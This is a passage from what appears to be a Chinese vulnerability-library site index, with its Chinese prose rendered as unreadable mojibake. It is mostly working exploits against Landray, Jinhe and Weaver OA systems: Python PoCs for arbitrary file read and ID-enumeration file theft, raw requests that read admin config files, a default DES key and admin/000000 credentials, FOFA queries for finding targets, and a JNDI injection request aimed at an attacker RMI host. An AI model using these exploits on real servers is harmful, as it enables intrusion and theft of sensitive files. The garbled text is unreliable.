\\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/sys/ui/extend/varkind/custom.jsp\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'var={\"body\":{\"file\":\"file:///etc/passwd\"}}' try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] Ê≠£Âú®ËØ∑Ê±Ç {}/sys/ui/extend/varkind/custom.jsp \\033[0m\".format(target_url)) if \"root:\" in response.text and response.status_code == 200: print(\"\\033[36m[o] ÊàêÂäüËØªÂèñ /etc/passwd \\n[o] ÂìçÂ∫î‰∏∫:{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥•:{} \\033[0m\".format(e)) sys.exit(0) # if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/ËìùÂáåOA/ËìùÂáåOA SSRF+JNDIËøúÁ®ãÂëΩ‰ª§ÊâßË°å.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/ËìùÂáåOA/ËìùÂáåOA SSRF+JNDIËøúÁ®ãÂëΩ‰ª§ÊâßË°å.html","title":"ËìùÂáåOA SSRF+JNDIËøúÁ®ãÂëΩ‰ª§ÊâßË°å","keywords":"","body":"ËìùÂáåOA SSRF+JNDIËøúÁ®ãÂëΩ‰ª§ÊâßË°å ÊºèÊ¥ûÊèèËø∞ Ê∑±Âú≥Â∏ÇËìùÂáåËΩØ‰ª∂ËÇ°‰ªΩÊúâÈôêÂÖ¨Âè∏Êï∞Â≠óOA(EKP)Â≠òÂú®‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û„ÄÇÊîªÂáªËÄÖÂèØÂà©Áî®ÊºèÊ¥ûËé∑ÂèñÊïèÊÑü‰ø°ÊÅØÔºåËØªÂèñÈÖçÁΩÆÊñá‰ª∂ÂæóÂà∞ÂØÜÈí•ÂêéËÆøÈóÆ admin.do Âç≥ÂèØÂà©Áî® JNDIËøúÁ®ãÂëΩ‰ª§ÊâßË°åËé∑ÂèñÊùÉÈôê ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ËìùÂáåOA FOFA [!NOTE] app=\"Landray-OAÁ≥ªÁªü\" ÊºèÊ¥ûÂ§çÁé∞ Âà©Áî® ËìùÂáåOA custom.jsp ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û ËØªÂèñÈÖçÁΩÆÊñá‰ª∂ /WEB-INF/KmssConfig/admin.properties ÂèëÈÄÅËØ∑Ê±ÇÂåÖ POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1 Host: User-Agent: Go-http-client/1.1 Content-Length: 60 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip var={\"body\":{\"file\":\"/WEB-INF/KmssConfig/admin.properties\"}} Ëé∑ÂèñpasswordÂêéÔºå‰ΩøÁî® DESÊñπÊ≥ï Ëß£ÂØÜÔºåÈªòËÆ§ÂØÜÈí•‰∏∫ kmssAdminKey ËÆøÈóÆÂêéÂè∞Âú∞ÂùÄ‰ΩøÁî®Ëß£ÂØÜÁöÑÂØÜÁ†ÅÁôªÂΩï http://xxx.xxx.xxx.xxx/admin.do ‰ΩøÁî®Â∑•ÂÖ∑ÊâßË°åÂëΩ‰ª§ https://github.com/welk1n/JNDI-Injection-Exploit java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [address] ËøêË°åÂ∑•ÂÖ∑ÁõëÂê¨Á´ØÂè£ ping dnslogÊµãËØï ÂëΩ‰ª§ÊâßË°å (ËìùÂáåOA ÈªòËÆ§‰ΩøÁî®ÁöÑÊòØ JDK 1.7) POST /admin.do HTTP/1.1 Host: Cookie: JSESSIONID=90EA764774514A566C480E9726BB3D3F; Hm_lvt_9838edd365000f753ebfdc508bf832d3=1620456866; Hm_lpvt_9838edd365000f753ebfdc508bf832d3=1620459967 Content-Length: 70 Cache-Control: max-age=0 Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\" Sec-Ch-Ua-Mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Origin: Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 method=testDbConn&datasource=rmi://xxx.xxx.xxx.xxx:1099/cbdsdg Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/ÈáëÂíåOA/":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/ÈáëÂíåOA/","title":"ÈáëÂíåOA","keywords":"","body":"ÈáëÂíåOA C6 ÁÆ°ÁêÜÂëòÈªòËÆ§Âè£‰ª§ ÈáëÂíåOA C6 ÁÆ°ÁêÜÂëòÈªòËÆ§Âè£‰ª§ ÈáëÂíåOA C6 download.jsp ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û ÈáëÂíåOA C6 ÂêéÂè∞Ë∂äÊùÉÊïèÊÑüÊñá‰ª∂ÈÅçÂéÜÊºèÊ¥û ÈáëÂíåOA C6 ÂêéÂè∞Ë∂äÊùÉÊïèÊÑüÊñá‰ª∂ÈÅçÂéÜÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/ÈáëÂíåOA/ÈáëÂíåOA C6 ÁÆ°ÁêÜÂëòÈªòËÆ§Âè£‰ª§.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/ÈáëÂíåOA/ÈáëÂíåOA C6 ÁÆ°ÁêÜÂëòÈªòËÆ§Âè£‰ª§.html","title":"ÈáëÂíåOA C6 ÁÆ°ÁêÜÂëòÈªòËÆ§Âè£‰ª§","keywords":"","body":"ÈáëÂíåOA C6 ÁÆ°ÁêÜÂëòÈªòËÆ§Âè£‰ª§ ÊºèÊ¥ûÊèèËø∞ ÈáëÂíåOA C6 Â≠òÂú®ÁÆ°ÁêÜÂëòÈªòËÆ§Ë¥¶Êà∑Âè£‰ª§ admin/000000 ÔºåÊîªÂáªËÄÖÂ∞Ü‰ª•ÁÆ°ÁêÜÂëòË∫´‰ªΩÁôªÈôÜÂêéÂè∞ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÈáëÂíåOA FOFA [!NOTE] app=\"Jinher-OA\" ÊºèÊ¥ûÂ§çÁé∞ Ë¥¶Âè∑ÂØÜÁ†Å admin/000000 ÁôªÂΩïÂêéÂè∞ Goby & POC [!NOTE] Â∑≤‰∏ä‰º† https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ÁõÆÂΩï‰∏≠ JingHe_OA_C6_Default_password Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/ÈáëÂíåOA/ÈáëÂíåOA C6 ÂêéÂè∞Ë∂äÊùÉ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/ÈáëÂíåOA/ÈáëÂíåOA C6 ÂêéÂè∞Ë∂äÊùÉ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û.html","title":"ÈáëÂíåOA C6 ÂêéÂè∞Ë∂äÊùÉ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û","keywords":"","body":"ÈáëÂíåOA C6 Ë∂äÊùÉ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÈáëÂíåOA C6 Â≠òÂú®Ë∂äÊùÉ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥ûÔºåÊôÆÈÄöÁî®Êà∑ÁôªÂΩïÂêéÂèØ‰ª•ÈÄöËøáÈÅçÂéÜIDÁºñÂè∑Ëé∑ÂèñÁÆ°ÁêÜÂëòÂèäÂÖ∂‰ªñÁî®Êà∑ÁöÑÊïèÊÑü‰ø°ÊÅØ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÈáëÂíåOA C6 FOFA [!NOTE] app=\"Jinher-OA\" ÊºèÊ¥ûÂ§çÁé∞ ‰ΩøÁî®ÊôÆÈÄöÁî®Êà∑ÁôªÂΩï OAÂ∫îÁî®ÂêéÂè∞ ËÆøÈóÆÁöÑPOC‰∏∫ http://xxx.xxx.xxx.xxx/C6/JHSoft.Web.Dossier/DossierBaseInfoView.aspx?CollID=1&UserID=RY120330 [!NOTE] Ê≥®ÊÑè RY120330 ÈúÄË¶Å‰∏∫Á°ÆÂÆöÁöÑÂÖ∂‰ªñÁöÑÁî®Êà∑ÁºñÂè∑ Ê≥ÑÈú≤‰∫ÜÈÉ®ÂàÜÁöÑÊïèÊÑü‰ø°ÊÅØ ÂèÇËÄÉÊñáÁ´† https://mp.weixin.qq.com/s/gwHQVIZeMWfT8a5lBX_4WA Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/ÈáëÂíåOA/ÈáëÂíåOA C6 ÂêéÂè∞Ë∂äÊùÉÊïèÊÑüÊñá‰ª∂ÈÅçÂéÜÊºèÊ¥û.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/ÈáëÂíåOA/ÈáëÂíåOA C6 ÂêéÂè∞Ë∂äÊùÉÊïèÊÑüÊñá‰ª∂ÈÅçÂéÜÊºèÊ¥û.html","title":"ÈáëÂíåOA C6 ÂêéÂè∞Ë∂äÊùÉÊïèÊÑüÊñá‰ª∂ÈÅçÂéÜÊºèÊ¥û","keywords":"","body":"ÈáëÂíåOA C6 ÂêéÂè∞Ë∂äÊùÉÊïèÊÑüÊñá‰ª∂ÈÅçÂéÜÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÈáëÂíåOA C6 Â≠òÂú®ÂêéÂè∞Ë∂äÊùÉÊïèÊÑüÊñá‰ª∂ÈÅçÂéÜÊºèÊ¥ûÔºåÊôÆÈÄöÁî®Êà∑ÈÄöËøáÈÅçÂéÜÁâπÊÆäÂèÇÊï∞ÂèØ‰ª•Ëé∑ÂèñÂÖ∂‰ªñÁî®Êà∑‰∏ä‰º†ÁöÑÊïèÊÑüÊñá‰ª∂ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÈáëÂíåOA C6 FOFA [!NOTE] app=\"Jinher-OA\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÂêéÁÇπÂáª‰ø°ÊÅØ‰∫§ÊµÅÔºåÂèëËµ∑ÂçèÂêåÈ°µÈù¢ ‰∏ä‰º†ÈôÑ‰ª∂Âπ∂‰∏ä‰º†ÂèëÈÄÅÁªôÁõÆÊ†á [!NOTE] ËøôÈáåÁôªÂΩïÊùÉÈôê‰∏∫ÁÆ°ÁêÜÂëòÔºåÊàë‰ª¨Ëá™Â∑±ÂèëÁªôËá™Â∑±Â∞±Â•ΩÔºåÂâçÊñáÂè™ÊòØÂ±ïÁé∞ÊºèÊ¥ûÊåñÊéòÊÄùË∑ØËøáÁ®ã ÊàêÂäüÊî∂Âà∞‰∏ä‰º†ÁöÑÈôÑ‰ª∂ ÁÇπÂáªÊü•ÁúãÊó∂ÊäìÂåÖÔºåÂèëÁé∞‰∏Ä‰∏™Â∏¶ÊúâÊñá‰ª∂IDÁöÑËØ∑Ê±ÇÂåÖ ËøîÂõû‰∫ÜÂá†‰∏™ÂèÇÊï∞ var strFilePath = '../Resource/slaves/1/8b473ecb-7b39-4384-ada2-b0ec72c4f6ed.png'; var strFileType = 'png'; var strSid='3jvpvhs410m2wdbbficax5q5'; var strFileIDCode='us9w7xWE7do='; var strId = '1229'; var strTxtReg = 'txt,ini,xml,config,htm,html,js,css,asp,aspx,jsp,cs,sql,inf,htc,log'; var strImgReg = 'jpg,gif,jpeg,png,ico'; var MD = ''; ÂÖ∂‰∏≠Êàë‰ª¨Ê≥®ÊÑèÂà∞ strFilePath ‰∏∫Êñá‰ª∂ÁöÑÂ≠òÂÇ®Âú∞ÂùÄÔºåÊàë‰ª¨Êõ¥Êîπ idÂèÇÊï∞‰∏∫Âè¶‰∏Ä‰∏™ÂÄºÔºå‰∏îÊµãËØïÂêéÂèëÁé∞ nameÊñá‰ª∂ÂêçÂèÇÊï∞Êó†ÂÖ≥Á¥ßË¶Å Êõ¥ÊîπIDÂêéÂèëÈÄÅËØ∑Ê±ÇÂåÖÂèëÁé∞Ëé∑ÂæóÂè¶‰∏Ä‰∏™Êñá‰ª∂ÁöÑ‰ø°ÊÅØ ËÆøÈóÆUrlÔºåÊ≥®ÊÑè typeÂèÇÊï∞ ÈúÄË¶Å‰∏∫Ê≠£Á°ÆÁöÑÊñá‰ª∂ÂêéÁºÄÊâçÂèØ‰ª•ËÆøÈóÆ http://xxx.xxx.xxx.xxx/C6/control/OpenFile.aspx?id=1200&name=&type=pdf ËøôÈáåÊõ¥Êç¢‰∏Ä‰∏™ÊôÆÈÄöÁî®Êà∑ÊµãËØïÊòØÂê¶ÂèØË°åÔºåÂ∞ùËØïÈÅçÂéÜ id Â≠òÂú® strFilePathÂèÇÊï∞ ÂàôÊòØÂ≠òÂú®Êñá‰ª∂Ôºå‰∏∫Á©∫ÂàôÊòØÊñá‰ª∂Â∑≤Áªè‰∏çÂ≠òÂú® ÂêåÊó∂ÊäìÂåÖ‰∏ãËΩΩÊñá‰ª∂È°µÈù¢‰πüÂèØ‰ª•ÁúãÂà∞ÂèØËé∑ÂèñÁöÑÂèÇÊï∞ FileID ‰∏é FileIDCode ‰∫éÊòØÂè™ÈúÄË¶ÅÈÄöËøáÂàöÂàöÁöÑIDÈÅçÂéÜÔºåËé∑Âèñ‰∏§‰∏™ÂÖ≥ÈîÆÂèÇÊï∞Â∞±ËÉΩ‰∏ãËΩΩÂÖ∂‰ªñ‰∫∫ÂèëÈÄÅÁöÑÊïèÊÑüÊñá‰ª∂Ôºå‰∏îÂè™ÈúÄË¶ÅÊôÆÈÄöÁî®Êà∑ÊùÉÈôê ÊºèÊ¥ûÂà©Áî®POC [!NOTE] POCÂè™Ê£ÄÊµãÊòØÂê¶Â≠òÂú®ÊºèÊ¥ûÔºå‰∏îÊºèÊ¥ûÂ≠òÂú®‰∫éÂêéÂè∞ÈúÄË¶ÅÁôªÂΩï ËøêË°åÂêéËÆøÈóÆÈìæÊé•Âç≥ÂèØ‰∏ãËΩΩÊñá‰ª∂ import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: ÈáëÂíåOA C6 \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url, file_id, cookie): vuln_url = target_url + \"/C6/control/OpenFile.aspx?id={}&name=&type=pdf\".format(file_id) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\":cookie } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] Ê≠£Âú®ËØ∑Ê±Ç Url: {}\\033[0m\".format(vuln_url)) if \"strFilePath =\" in response.text and response.status_code == 200: strFilePath = re.findall(r\"var strFilePath = '(.*?)';\", response.text)[0] strFileType = strFilePath[-3:] strFileIDCode = re.findall(r\"var strFileIDCode='(.*?)';\", response.text)[0] strId = re.findall(r\"var strId = '(.*?)';\", response.text)[0] sid = re.findall(r'ASP.NET_SessionId=(.*?);', cookie)[0] if strFilePath != \"\": print(\"\\033[36m[o] ÁõÆÊ†á {} Â≠òÂú®ÊºèÊ¥û, Ëé∑ÂèñÊñá‰ª∂‰ø°ÊÅØ:\\n[o] Êñá‰ª∂Ë∑ØÂæÑÔºö{}\\n[o] Êñá‰ª∂Á±ªÂûãÔºö{}\\n[o] Êñá‰ª∂ID codeÔºö{}\\n[o] Êñá‰ª∂ÁºñÂè∑Ôºö {}\\033[0m\".format(target_url, strFilePath, strFileType,strFileIDCode, strId )) print(\"\\033[32m[o] Êñá‰ª∂‰∏ãËΩΩÈìæÊé•‰∏∫: {}/C6/JHSoft.Web.CustomQuery/uploadFileDownLoad.aspx?Decrypt=&FileID={}&FileIDCode={}&sid={}\".format(target_url, strId, strFileIDCode, sid)) else: print(\"\\033[31m[x] ÁõÆÊ†á {} Êñá‰ª∂‰∏çÂ≠òÂú® \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] ÁõÆÊ†á {} ‰∏çÂ≠òÂú®ÊºèÊ¥û \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) file_id = str(input(\"\\033[35mFile_id >>> \\033[0m\")) cookie = str(input(\"\\033[35mCookie >>> \\033[0m\")) POC_1(target_url, file_id, cookie) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/ÈáëÂíåOA/ÈáëÂíåOA C6 download.jsp ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/ÈáëÂíåOA/ÈáëÂíåOA C6 download.jsp ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û.html","title":"ÈáëÂíåOA C6 download.jsp ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û","keywords":"","body":"ÈáëÂíåOA C6 download.jsp ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÈáëÂíåOA C6 download.jspÊñá‰ª∂Â≠òÂú®‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥ûÔºåÊîªÂáªËÄÖÈÄöËøáÊºèÊ¥ûÂèØ‰ª•Ëé∑ÂèñÊúçÂä°Âô®‰∏≠ÁöÑÊïèÊÑü‰ø°ÊÅØ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÈáëÂíåOA FOFA [!NOTE] app=\"Jinher-OA\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ÊºèÊ¥ûÊñá‰ª∂‰∏∫ download.asp \"\" Then '******************************‰∏ãËΩΩÊñá‰ª∂Â≠òÊîæÁöÑÊúçÂä°Á´ØÁõÆÂΩï url=server.MapPath(Dname) 'url=server.MapPath(\"./\")&\"\\Jhsoft.Web.module\\testbill\\dj\"&Dname 'ËøôËæπÂÅö‰∫Ü‰∏Ä‰∏ãÊîπÂä®By Fanshui '*************************************************** End If 'Response.write url 'response.end Set fso=Server.CreateObject(\"Scripting.FileSystemObject\") Set fl=fso.getfile(url) flsize=fl.size flName=fl.name Set fl=Nothing Set fso=Nothing 'Response.write flName 'Response.write flsize %> ËØ∑Ê±ÇÁöÑPOC‰∏∫ /C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config ËØªÂèñ web.config /C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/Ê≥õÂæÆOA/":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/Ê≥õÂæÆOA/","title":"Ê≥õÂæÆOA","keywords":"","body":"Ê≥õÂæÆOA Ê≥õÂæÆOA weaver.common.Ctrl ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û Ê≥õÂæÆ‰∫ëÊ°• e-Bridge ‰ªªÊÑèÊñá‰ª∂ËØªÂèñ Ê≥õÂæÆOA Bsh ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CNVD-2019-32204 Ê≥õÂæÆOA e-cology Êï∞ÊçÆÂ∫ìÈÖçÁΩÆ‰ø°ÊÅØÊ≥ÑÊºèÊºèÊ¥û Ê≥õÂæÆOA WorkflowCenterTreeDataÊé•Âè£SQLÊ≥®ÂÖ•(‰ªÖÈôêoracleÊï∞ÊçÆÂ∫ì) CNVD-2019-34241 Ê≥õÂæÆOA sysinterface/codeEdit.jsp È°µÈù¢‰ªªÊÑèÊñá‰ª∂‰∏ä‰º† WooYun-2015-0155705 Ê≥õÂæÆOA V9 ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º† Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/Ê≥õÂæÆOA/Ê≥õÂæÆ‰∫ëÊ°• e-Bridge ‰ªªÊÑèÊñá‰ª∂ËØªÂèñ.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/Ê≥õÂæÆOA/Ê≥õÂæÆ‰∫ëÊ°• e-Bridge ‰ªªÊÑèÊñá‰ª∂ËØªÂèñ.html","title":"Ê≥õÂæÆ‰∫ëÊ°• e-Bridge ‰ªªÊÑèÊñá‰ª∂ËØªÂèñ","keywords":"","body":"Ê≥õÂæÆ‰∫ëÊ°• e-Bridge ‰ªªÊÑèÊñá‰ª∂ËØªÂèñ ÊºèÊ¥ûÊèèËø∞ Ê≥õÂæÆ‰∫ëÊ°•Ôºàe-BridgeÔºâÊòØ‰∏äÊµ∑Ê≥õÂæÆÂÖ¨Âè∏Âú®‚Äù‰∫íËÅîÁΩë+‚ÄùÁöÑËÉåÊôØ‰∏ãÁ†îÂèëÁöÑ‰∏ÄÊ¨æÁî®‰∫éÊ°•Êé•‰∫íËÅîÁΩëÂºÄÊîæËµÑÊ∫ê‰∏é‰ºÅ‰∏ö‰ø°ÊÅØÂåñÁ≥ªÁªüÁöÑÁ≥ªÁªüÈõÜÊàê‰∏≠Èó¥‰ª∂„ÄÇÊ≥õÂæÆ‰∫ëÊ°•Â≠òÂú®‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥ûÔºåÊîªÂáªËÄÖÊàêÂäüÂà©Áî®ËØ•ÊºèÊ¥ûÔºåÂèØÂÆûÁé∞‰ªªÊÑèÊñá‰ª∂ËØªÂèñÔºåËé∑ÂèñÊïèÊÑü‰ø°ÊÅØ„ÄÇ ÂΩ±ÂìçÁâàÊú¨ [!NOTE] Ê≥õÂæÆ‰∫ëÊ°• e-Bridge 2018-2019 Â§ö‰∏™ÁâàÊú¨ FOFA [!NOTE] title=\"Ê≥õÂæÆ‰∫ëÊ°•e-Bridge\" ÊºèÊ¥ûÂ§çÁé∞ [!NOTE] ÂàÜ‰∏∫‰∏§ÁßçÔºåÂàÜÂà´‰∏∫ Windows Âíå Linux Windows ËÆøÈóÆ http://xxx.xxx.xxx.xxx/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt ÊàêÂäüËøîÂõû idÂÄº,ËØ¥ÊòéÂê´ÊúâÊ≠§ÊºèÊ¥û Ë∞ÉÁî®Êü•ÁúãÊñá‰ª∂Êé•Âè£ËÆøÈóÆ http://xxx.xxx.xxx.xxx/file/fileNoLogin/idÂÄº Linux ËÆøÈóÆ http://xxx.xxx.xxx.xxx/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt ÊàêÂäüËøîÂõû idÂÄº,ËØ¥ÊòéÂê´ÊúâÊ≠§ÊºèÊ¥û Ë∞ÉÁî®Êü•ÁúãÊñá‰ª∂Êé•Âè£ËÆøÈóÆ http://xxx.xxx.xxx.xxx/file/fileNoLogin/idÂÄº ÊºèÊ¥ûÂà©Áî®POC [!NOTE] Ê≥®ÊÑèËØªÂèñLinuxÁ≥ªÁªüÊñá‰ª∂Êó∂ÔºåÈúÄË¶ÅÂÆåÊï¥Ë∑ØÂæÑ ‰æãÂ¶ÇËØªÂèñÊ†πÁõÆÂΩï‰∏ãÁöÑ 1.txt Â∫î‰∏∫ /1.txt ËÄå‰∏çÊòØ 1.txt #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: Ê≥õÂæÆ‰∫ëÊ°• e-Bridge \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') # Âà§Êñ≠Êìç‰ΩúÁ≥ªÁªü or Âà§Êñ≠ÊºèÊ¥ûÊòØÂê¶ÂèØÂà©Áî® def POC_1(target_url): vuln_url_1 = target_url + \"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt\" vuln_url_2 = target_url + \"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt\" vuln_url_3 = target_url + \"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///&fileExt=txt\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } try: response_1 = requests.get(url=vuln_url_1, headers=headers, verify=False, timeout=10) response_2 = requests.get(url=vuln_url_2, headers=headers, verify=False, timeout=10) response_3 = requests.get(url=vuln_url_3, headers=headers, verify=False, timeout=10) if \"Êó†Ê≥ïÈ™åËØÅÊÇ®ÁöÑË∫´‰ªΩ\" in response_1.text and \"Êó†Ê≥ïÈ™åËØÅÊÇ®ÁöÑË∫´‰ªΩ\" in response_2.text: print(\"\\033[31m[x] ÊºèÊ¥ûÂ∑≤‰øÆÂ§çÔºå‰∏çÂ≠òÂú®ÊºèÊ¥û \\033[0m\") sys.exit(0) else: if \"No such file or directory\" in response_1.text: print(\"\\033[32m[o] ÁõÆÊ†á‰∏∫ Linux Á≥ªÁªü\\033[0m\") id = re.findall(r'\"id\":\"(.*?)\"', response_3.text)[0] print(\"\\033[32m[o] ÊàêÂäüËé∑ÂèñidÔºö{}\\033[0m\".format(id)) return id,\"linux\" elif \"Á≥ªÁªüÊâæ‰∏çÂà∞ÊåáÂÆöÁöÑË∑ØÂæÑ\" in response_2.text: print(\"\\033[32m[o] ÁõÆÊ†á‰∏∫ Windows Á≥ªÁªü\\033[0m\") id = re.findall(r'\"id\":\"(.*?)\"', response_1.text)[0] print(\"\\033[32m[o] ÊàêÂäüËé∑ÂèñidÔºö{}\\033[0m\".format(id)) return id,\"windows\" else: print(\"\\033[31m[x] Êó†Ê≥ïËé∑ÂèñÁõÆÊ†áÁ≥ªÁªü\\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥•:{} \\033[0m\".format(e)) sys.exit(0) # È™åËØÅÊºèÊ¥û def POC_2(target_url, id): file_url = target_url + \"/file/fileNoLogin/{}\".format(id) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) 